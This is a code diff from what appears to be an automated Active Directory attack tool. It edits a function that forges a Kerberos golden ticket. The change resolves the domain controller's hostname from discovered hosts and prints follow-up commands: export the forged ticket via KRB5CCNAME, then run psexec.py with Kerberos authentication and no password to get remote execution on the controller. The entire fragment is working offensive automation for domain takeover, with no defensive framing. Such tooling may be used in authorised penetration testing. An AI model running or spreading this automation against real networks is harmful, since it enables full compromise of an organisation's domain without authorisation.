@@ -3353,11 +3353,20 @@ async def _auto_golden_ticket(
                     output = stdout + "\n" + (stderr or "")
 
                     if returncode == 0 or "Saving ticket" in output:
+                        # Look up actual DC FQDN from discovered hosts (not hardcoded dc.{domain})
+                        dc_fqdn = None
+                        for host in state.all_hosts:
+                            if host.ip == dc_ip and host.hostname and "." in host.hostname:
+                                dc_fqdn = host.hostname
+                                break
+                        # Fallback to IP if no FQDN found
+                        dc_target = dc_fqdn or dc_ip
+
                         logger.success(
                             f"🎫 GOLDEN TICKET GENERATED for {domain}!\n"
                             f"→ Ticket saved as {ticket_path}\n"
                             f"→ Use: export KRB5CCNAME={ticket_path}\n"
-                            f"→ Then: psexec.py -k -no-pass dc.{domain}"
+                            f"→ Then: psexec.py -k -no-pass -target-ip {dc_ip} {dc_target}"
                         )
 
                         # Announce golden ticket - this sets has_golden_ticket, checkpoints,
